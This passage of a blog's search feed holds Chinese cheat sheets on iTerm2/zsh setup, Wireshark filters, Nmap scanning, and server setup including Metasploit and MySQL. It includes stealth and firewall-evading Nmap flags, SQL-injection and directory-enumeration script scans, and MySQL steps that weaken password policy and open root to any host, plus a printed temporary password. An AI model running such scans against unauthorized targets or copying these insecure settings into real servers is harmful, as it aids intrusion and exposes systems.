Shell（这样新建标签的时候才会使用 Zsh）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之前.zshrc 配置了mvn,记得重新加上</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">MAVEN_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;apache-maven-3.6.3PATH&#x3D;$MAVEN_HOME&#x2F;bin:$PATHexport MAVEN_HOMEexport PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>主题修改为<code>ZSH_THEME=&quot;agnoster&quot;</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim ~&#x2F;.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2021/03/27/iterm2-pei-zhi/img-1.png" class="slug"><!--`agnoster`是比较常用的 zsh 主题之一，你可以挑选你喜欢的主题，zsh 主题列表：[https://github.com/robbyrussell/oh-my-zsh/wiki/themes](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Frobbyrussell%2Foh-my-zsh%2Fwiki%2Fthemes)--><h3 id="lt-1-3-配置Meslo字体"><a href="#lt-1-3-配置Meslo字体" class="headerlink" title="&lt;1.3 配置Meslo字体"></a>&lt;1.3 配置Meslo字体</h3><p>使用上面的主题，需要 Meslo 字体支持，要不然会出现乱码的情况，字体下载地址：<a href="https://links.jianshu.com/go?to=https://github.com/powerline/fonts/blob/master/Meslo%20Slashed/Meslo%20LG%20M%20Regular%20for%20Powerline.ttf">Meslo LG M Regular for Powerline.ttf</a></p><p>下载好之后，找到对应的字体,直接在 Mac OS 中安装即可。</p><p>然后打开 iTerm2，按<code>Command + ,</code>键，打开 Preferences 配置界面，然后<code>Profiles -&gt; Text -&gt; Font -&gt; Chanage Font</code>，选择 Meslo LG M Regular for Powerline 字体。</p><h3 id="lt-1-4-声明高亮"><a href="#lt-1-4-声明高亮" class="headerlink" title="&lt;1.4 声明高亮"></a>&lt;1.4 声明高亮</h3><p>特殊命令和错误命令，会有高亮显示。</p><p>使用 Homebrew 安装：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ brew install zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装成功之后，编辑vim ~/.zshrc文件，在最后一行增加下面配置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">source &#x2F;usr&#x2F;local&#x2F;share&#x2F;zsh-syntax-highlighting&#x2F;zsh-syntax-highlighting.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="lt-1-5-自动建议填充"><a href="#lt-1-5-自动建议填充" class="headerlink" title="&lt;1.5 自动建议填充"></a>&lt;1.5 自动建议填充</h3><p>这个功能是非常实用的，可以方便我们快速的敲命令</p><p>配置步骤，先克隆zsh-autosuggestions项目，到指定目录：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions # github地址mv zsh-autosuggestions ~&#x2F;.oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后编辑<code>vim ~/.zshrc</code>文件，找到plugins配置，增加<code>zsh-autosuggestions</code>插件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim ~&#x2F;.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2021/03/27/iterm2-pei-zhi/img-2.png" class="slug"><h3 id="lt-1-6-iTerm2-快速隐藏和显示窗体"><a href="#lt-1-6-iTerm2-快速隐藏和显示窗体" class="headerlink" title="&lt;1.6 iTerm2 快速隐藏和显示窗体"></a>&lt;1.6 iTerm2 快速隐藏和显示窗体</h3><p>打开 iTerm2，按<code>Command + ,</code>键，打开 Preferences 配置界面，然后Profiles → Keys →Hotkey，自定义一个快捷键就可以了。</p><img src="/2021/03/27/iterm2-pei-zhi/img-3.png" class="slug"><h3 id="lt-1-7-iTerm2-隐藏用户名和主机名"><a href="#lt-1-7-iTerm2-隐藏用户名和主机名" class="headerlink" title="&lt;1.7 iTerm2 隐藏用户名和主机名"></a>&lt;1.7 iTerm2 隐藏用户名和主机名</h3><p>有时候我们的用户名和主机名太长，终端显示的时候会很不好看，我们可以手动去除。</p><p>编辑<code>vim ~/.zshrc</code>文件，增加<code>DEFAULT_USER=&quot;SKong&quot;</code>配置.</p><p>但是: 我的电脑没生效,至今未找到原因~~~<br><code>补充:已经找到原因,这个地方应该设置为: DEFAULT_USER=&quot;你电脑的用户名&quot;</code><br>比如:我的电脑用户名为pactepacterara,则DEFAULT_USER=”pactepacterara”<br>感谢网友<a href="https://blog.csdn.net/u/c57aa48a99b8">码渣</a>!</p><img src="/2021/03/27/iterm2-pei-zhi/img-4.png" class="slug"><h3 id="lt-1-8-Iterm2-快捷指令"><a href="#lt-1-8-Iterm2-快捷指令" class="headerlink" title="&lt;1.8 Iterm2 快捷指令"></a>&lt;1.8 Iterm2 快捷指令</h3><p>在iterm2中，选中某个路径或者某个词汇，iterm2就自动复制了,很方便。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">command + enter 进入与返回全屏模式command + t 新建标签command + w 关闭标签command + 数字 command + 左右方向键    切换标签command + enter 切换全屏command + f 查找command + d 水平分屏command + shift + d 垂直分屏command + option + 方向键 command + [ 或 command + ]    切换屏幕command + ; 查看历史命令command + shift + h 查看剪贴板历史ctrl + u    清除当前行ctrl + l    清屏ctrl + a    到行首ctrl + e    到行尾ctrl + f&#x2F;b  前进后退ctrl + p    上一条命令ctrl + r    搜索命令历史<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lt-1-9-卸载oh-my-zsh"><a href="#lt-1-9-卸载oh-my-zsh" class="headerlink" title="&lt;1.9 卸载oh-my-zsh"></a>&lt;1.9 卸载oh-my-zsh</h3><p>进入到.oh-my-zsh/tools目录,依次执行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$cd .oh-my-zsh&#x2F;toolschmod +x uninstall.sh.&#x2F;uninstall.shrm -rif .zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关于-oh-my-zsh-提示检测到不安全的完成相关目录"><a href="#关于-oh-my-zsh-提示检测到不安全的完成相关目录" class="headerlink" title="关于[oh-my-zsh] 提示检测到不安全的完成相关目录"></a>关于[oh-my-zsh] 提示检测到不安全的完成相关目录</h2><ol><li>在.zshrc文件的第一行添加 <code>ZSH_DISABLE_COMPFIX=true</code></li></ol><p>参考链接：<a href="https://blog.csdn.net/qq_36955294/article/details/109340448?utm_term=iterm2%E9%85%8D%E7%BD%AE&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-109340448&amp;spm=3001.4430">https://blog.csdn.net/qq_36955294/article/details/109340448?utm_term=iterm2%E9%85%8D%E7%BD%AE&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-109340448&amp;spm=3001.4430</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark 语法</title>
      <link href="2020/05/27/wireshark-yu-fa/"/>
      <url>2020/05/27/wireshark-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark语法"><a href="#Wireshark语法" class="headerlink" title="Wireshark语法"></a>Wireshark语法</h1><span id="more"></span><h2 id="1-1-过滤IP"><a href="#1-1-过滤IP" class="headerlink" title="1.1 过滤IP"></a>1.1 过滤IP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ip.src eq ## ip.src &#x3D;&#x3D; 显示来源IPip.dst eq ## ip.dst &#x3D;&#x3D; 显示目的IPip.addr eq ##显示IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="1-2-过滤端口"><a href="#1-2-过滤端口" class="headerlink" title="1.2 过滤端口"></a>1.2 过滤端口</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcp.port eq 3306 #不管端口是来源还是目标都显示tcp.dstport&#x3D;&#x3D;80 #只显示tcp协议的目标端口80tcp.srcport&#x3D;&#x3D;80 #只显示tcp协议的来源端口80tcp.port&gt;&#x3D;1 and tcp.port &lt;&#x3D;80 #过滤端口范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-3-过滤协议"><a href="#1-3-过滤协议" class="headerlink" title="1.3 过滤协议"></a>1.3 过滤协议</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcpudparpicmphttpsmtpfrpdnsmsnmsipssloicpbootp!arp &#x2F; not arp #排除ARP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-4-过滤MAC"><a href="#1-4-过滤MAC" class="headerlink" title="1.4 过滤MAC"></a>1.4 过滤MAC</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">　eth.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤目标mac　　eth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源mac　　eth.dst&#x3D;&#x3D;A0:00:00:04:C5:84　　eth.dst&#x3D;&#x3D;A0-00-00-04-C5-84　　eth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的　　less than 小于 &lt; lt　　小于等于 le　　等于 eq　　大于 gt　　大于等于 ge　　不等 ne<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-5包长度过滤"><a href="#1-5包长度过滤" class="headerlink" title="1.5包长度过滤"></a>1.5包长度过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">udp.length &#x3D;&#x3D; 26 这个长度是指udp本身固定长度8加上udp下面那块数据包之和　　tcp.len &gt;&#x3D; 7 指的是ip数据包(tcp下面那块数据),不包括tcp本身　　ip.len &#x3D;&#x3D; 94 除了以太网头固定长度14,其它都算是ip.len,即从ip本身到最后　　frame.len &#x3D;&#x3D; 119 整个数据包长度,从eth开始到最后　　eth —&gt; ip or arp —&gt; tcp or udp —&gt; data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-6-http-模式过滤"><a href="#1-6-http-模式过滤" class="headerlink" title="1.6 http 模式过滤"></a>1.6 http 模式过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">　http.request.method &#x3D;&#x3D; &quot;GET”　　http.request.method &#x3D;&#x3D; &quot;POST”　　http.request.uri &#x3D;&#x3D; &quot;&#x2F;img&#x2F;logo-edu.gif”　　http contains &quot;GET”　　http contains &quot;HTTP&#x2F;1.”　　&#x2F;&#x2F; GET包　　http.request.method &#x3D;&#x3D; &quot;GET” &amp;&amp; http contains &quot;Host: &quot;　　http.request.method &#x3D;&#x3D; &quot;GET” &amp;&amp; http contains &quot;User-Agent: &quot;　　&#x2F;&#x2F; POST包　　http.request.method &#x3D;&#x3D; &quot;POST” &amp;&amp; http contains &quot;Host: &quot;　　http.request.method &#x3D;&#x3D; &quot;POST” &amp;&amp; http contains &quot;User-Agent: &quot;　　&#x2F;&#x2F; 响应包　　http contains &quot;HTTP&#x2F;1.1 200 OK” &amp;&amp; http contains &quot;Content-Type: &quot;　　http contains &quot;HTTP&#x2F;1.0 200 OK” &amp;&amp; http contains &quot;Content-Type: &quot;　　一定包含如下　　Content-Type:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-7-TCP-参数过滤"><a href="#1-7-TCP-参数过滤" class="headerlink" title="1.7 TCP 参数过滤"></a>1.7 TCP 参数过滤</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tcp.flags 显示包含TCP标志的封包。　　tcp.flags.syn &#x3D;&#x3D; 0x02 显示包含TCP SYN标志的封包。　　tcp.window_size &#x3D;&#x3D; 0 &amp;&amp; tcp.flags.reset !&#x3D; 1　　8.包内容过滤　　tcp[20]表示从20开始，取1个字符　　tcp[20:]表示从20开始，取1个字符以上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-8"><a href="#1-8" class="headerlink" title="1.8"></a>1.8</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap 命令速查</title>
      <link href="2020/01/28/nmap-ming-ling-su-cha/"/>
      <url>2020/01/28/nmap-ming-ling-su-cha/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-命令详解"><a href="#Nmap-命令详解" class="headerlink" title="Nmap 命令详解"></a>Nmap 命令详解</h1><span id="more"></span><h2 id="1-端口扫描探测"><a href="#1-端口扫描探测" class="headerlink" title="1.端口扫描探测"></a>1.端口扫描探测</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">-sT   #TCP connect() 扫描，这种方式会在目标主机中的日志中记录大量的链接请求和错误信息-sS   #半开扫描，很少有系统将其记录在系统日志，需要root权限-sF -sN  #密码FIN数据包扫描，Xmas Tree、Null扫描模式-sP  #ping 扫描，nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描-sU  #UDP扫描，但不可靠-sA  #这项高级的扫描方式通常用来穿过防火墙的规则集-sV  #探测端口服务版本-P0  #扫描之前不需要使用ping命令-v  #显示扫描过程-h  #帮助选项-p  #制定端口-O  #启用远程操作系统检测，启动脚本检测、扫描-A  #全面系统检测，启用脚本检测，扫描-oN&#x2F;-oX&#x2F;-oG #将报告写入文件，正常&#x2F;XML&#x2F;grepable 三种格式-T4 #针对TCP端口禁止动态扫描延迟超过十秒-iL #读取主机列表 例如 -iL C：\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-web扫描"><a href="#2-web扫描" class="headerlink" title="2.web扫描"></a>2.web扫描</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p 80 --script&#x3D;http-enum.nse www.xxx.com. #扫描敏感目录nmap -p 80 --script&#x3D;sql-injection.nse www.xxx.com # 扫描sql注入nmap --script all 127.0.0.1 #所有脚本扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器相关配置</title>
      <link href="2020/01/27/fu-wu-qi-xiang-guan-pei-zhi-zi-cha-biao/"/>
      <url>2020/01/27/fu-wu-qi-xiang-guan-pei-zhi-zi-cha-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><span id="more"></span><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><ol><li><h4 id="下载docker-ce的repo"><a href="#下载docker-ce的repo" class="headerlink" title="下载docker-ce的repo"></a>下载docker-ce的repo</h4></li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl https:&#x2F;&#x2F;[download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo](http:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo) -o &#x2F;etc&#x2F;yum.repos.d&#x2F;docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装依赖（这是相比centos7的关键步骤）</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install https:&#x2F;&#x2F;[download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm](http:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>安装docker-ce</li></ol><p><code>yum install docker-ce -y</code></p><ol start="4"><li>启动docker</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker-compose"></a>Docker-compose</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip3 install docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Screen-配置"><a href="#Screen-配置" class="headerlink" title="Screen 配置"></a>Screen 配置</h2><p>1.安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install screen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.相关参数</p><pre class="line-numbers language-none"><code class="language-none">screen -S yourname -&gt; 新建一个叫yourname的sessionscreen -ls         -&gt; 列出当前所有的sessionscreen -r yourname -&gt; 回到yourname这个sessionscreen -d yourname -&gt; 远程detach某个sessionscreen -d -r yourname -&gt; 结束当前session并回到yourname这个session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置MSF"><a href="#配置MSF" class="headerlink" title="配置MSF"></a>配置MSF</h2><p>1.下载msf</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install curl,wgetcurl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  .&#x2F;msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.非root 权限使用 MSF( 成功安装后请运行下属代码，以使下载的最新版本的msf连接数据库。)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">adduser msfsu msf.&#x2F;msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.PS.在运行时请cd到msfconsole所在目录，应在”/opt/metasploit-framework/bin”</p><p>初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用以下命令，然后使用非root用户初始化数据库。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfdb reinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装Kali"><a href="#安装Kali" class="headerlink" title="安装Kali"></a>安装Kali</h2><p>1.启动docker</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker pull toolisticon&#x2F;kalilinux  docker run -t -i toolisticon&#x2F;kalilinux   &#x2F;bin&#x2F;bashapt-get update &amp;&amp; apt-get install metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h2><p>1.获取wget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum -y install wget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.下载mysql安装包</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql57-community-release-el7-8.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.安装MySQL</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rpm -ivh mysql57-community-release-el7-8.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.安装mysql服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cd &#x2F;etc&#x2F;yum.repos.d&#x2F;yum -y install mysql-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.启动mysql</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl start mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.修改MySQL临时密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">grep &#39;temporary password&#39; &#x2F;var&#x2F;log&#x2F;mysqld.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.登录mysql</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mysql -uroot -p #我的临时密码是：a22XRJ88&#x3D;+a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.把MySQL的密码校验强度改为低风险</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set global validate_password_policy&#x3D;LOW;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9.修改MySQL的密码长度</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set global validate_password_length&#x3D;5;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10.修改MySQL密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;xxx&#39;; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11.若允许远程访问，首先要关闭Cenots的防火墙</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mysql -u root -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>12.切换到mysql数据</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">use mysql;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>13.修改为允许任何地址访问</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">update user set Host&#x3D;&#39;%&#39; where User&#x3D;&#39;root&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>14.刷新权限</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
